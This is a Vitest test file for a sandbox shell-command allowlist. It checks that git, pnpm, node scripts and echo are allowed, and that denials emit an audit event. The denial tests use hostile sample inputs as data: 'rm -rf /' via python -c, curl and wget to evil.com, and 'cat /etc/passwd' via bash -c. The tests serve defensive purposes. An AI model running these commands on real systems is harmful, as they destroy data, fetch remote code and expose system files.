import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { validateCommand } from './sandbox.js';

// Spy on eventBus to verify audit events
vi.mock('@ninja/events', () => {
  const emitted: Array<{ type: string; payload: unknown }> = [];
  return {
    eventBus: {
      emit: vi.fn((event: { type: string; payload: unknown }) => emitted.push(event)),
      _emitted: emitted,
    },
    createEvent: vi.fn((type: string, _source: string, payload: unknown) => ({ type, payload })),
  };
});

import { eventBus } from '@ninja/events';

const mockEventBus = eventBus as unknown as {
  emit: ReturnType<typeof vi.fn>;
  _emitted: Array<{ type: string; payload: unknown }>;
};

beforeEach(() => {
  mockEventBus.emit.mockClear();
  mockEventBus._emitted.length = 0;
  delete process.env.SHELL_ALLOWLIST_EXTRA;
});

afterEach(() => {
  delete process.env.SHELL_ALLOWLIST_EXTRA;
});

describe('Shell allowlist (WP-B12)', () => {
  // ── Permitidos ──────────────────────────────────────────────────────────

  it('git log → allowed', () => {
    const result = validateCommand({ cmd: 'git', args: ['log', '--oneline'] });
    expect(result.allowed).toBe(true);
  });

  it('git status → allowed', () => {
    const result = validateCommand({ cmd: 'git', args: ['status'] });
    expect(result.allowed).toBe(true);
  });

  it('pnpm build → allowed', () => {
    const result = validateCommand({ cmd: 'pnpm', args: ['build'] });
    expect(result.allowed).toBe(true);
  });

  it('node script.mjs → allowed', () => {
    const result = validateCommand({ cmd: 'node', args: ['script.mjs'] });
    expect(result.allowed).toBe(true);
  });

  it('echo hello → allowed', () => {
    const result = validateCommand({ cmd: 'echo', args: ['hello'] });
    expect(result.allowed).toBe(true);
  });

  // ── Bloqueados (bypasses históricos) ────────────────────────────────────

  it('python -c "..." → DENIED (python no está en allowlist)', () => {
    const result = validateCommand({ cmd: 'python', args: ['-c', 'import os; os.system("rm -rf /")'] });
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain("not in allowlist");
  });

  it('node -e "..." → DENIED (node solo permite scripts .mjs/.cjs/.js/.ts)', () => {
    const result = validateCommand({ cmd: 'node', args: ['-e', 'require("child_process").exec("curl evil.com")'] });
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain("not in allowlist");
  });

  it('curl http://... → DENIED (curl no está en allowlist)', () => {
    const result = validateCommand({ cmd: 'curl', args: ['http://evil.com'] });
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain("not in allowlist");
  });

  it('powershell -Command → DENIED', () => {
    const result = validateCommand({ cmd: 'powershell', args: ['-Command', 'Get-Process'] });
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain("not in allowlist");
  });

  it('wget → DENIED', () => {
    const result = validateCommand({ cmd: 'wget', args: ['http://evil.com/malware'] });
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain("not in allowlist");
  });

  it('bash → DENIED', () => {
    const result = validateCommand({ cmd: 'bash', args: ['-c', 'cat /etc/passwd'] });
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain("not in allowlist");
  });

  it('sh -c → DENIED', () => {
    const result = validateCommand({ cmd: 'sh', args: ['-c', 'echo pwned'] });
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain("not in allowlist");
  });

  // ── Allowlist extra ──────────────────────────────────────────────────────

  it('con SHELL_ALLOWLIST_EXTRA=docker → docker ps allowed', () => {
    process.env.SHELL_ALLOWLIST_EXTRA = 'docker';
    const result = validateCommand({ cmd: 'docker', args: ['ps'] });
    expect(result.allowed).toBe(true);
  });

  // ── Audit event ─────────────────────────────────────────────────────────

  it('comando denegado emite shell.command.denied en eventBus', () => {
    validateCommand({ cmd: 'curl', args: ['http://evil.com'] });
    expect(mockEventBus.emit).toHaveBeenCalledOnce();
    const call = mockEventBus.emit.mock.calls[0][0] as { type: string };
    expect(call.type).toBe('shell.command.denied');
  });

  it('comando permitido NO emite shell.command.denied', () => {
    validateCommand({ cmd: 'git', args: ['status'] });
    expect(mockEventBus.emit).not.toHaveBeenCalled();
  });
});
